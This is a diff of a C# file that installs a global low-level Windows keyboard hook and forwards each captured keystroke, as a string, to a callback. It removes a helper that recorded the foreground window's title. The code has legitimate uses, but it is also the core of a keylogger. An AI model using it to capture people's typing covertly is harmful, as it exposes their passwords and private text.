@@ -11,12 +11,6 @@ namespace KeyboardHooks
 {
     public static class CoreFunctionImport
     {
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll")]
-        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);
-
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -30,32 +24,25 @@ namespace KeyboardHooks
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
-        public static Action<string> CallbackAction { get; set; }
+
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-
+                
                 int keyCode = Marshal.ReadInt32(lParam);
                 KeysConverter kc = new KeysConverter();
                 string mystring = kc.ConvertToString((Keys)keyCode);
-                CallbackAction(mystring);
-
+                BeginHooks.CallbackAction(mystring);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        public static string GetNameOfApp()
+        public static void add(Action<string> aa, string bb)
         {
-            IntPtr h = GetForegroundWindow();
-            int pid = 0;
-            GetWindowThreadProcessId(h, ref pid);
-            Process p = Process.GetProcessById(pid);
-            return p.MainWindowTitle;
-
+            aa(bb);
         }
-
         public const int WH_KEYBOARD_LL = 13;
         public const int WM_KEYDOWN = 0x0100;
         public static LowLevelKeyboardProc _proc = HookCallback;
